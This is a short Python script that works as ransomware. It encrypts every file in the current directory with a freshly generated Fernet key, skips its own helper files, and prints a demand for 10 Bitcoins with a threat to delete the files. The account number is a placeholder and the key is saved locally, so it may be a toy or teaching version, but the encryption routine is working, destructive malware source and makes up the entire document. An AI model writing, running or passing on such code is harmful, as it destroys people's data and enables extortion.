#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "decrypt.sh" or file == "encrypt.sh" or file == "netcat.sh" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
	thekey.write(key)
	

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents) 
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
print("Warning! All your files are encrypted. If you do not deposit 10 Bitcoins to this account 12345 in the next 24 hours, all files will be deleted.")
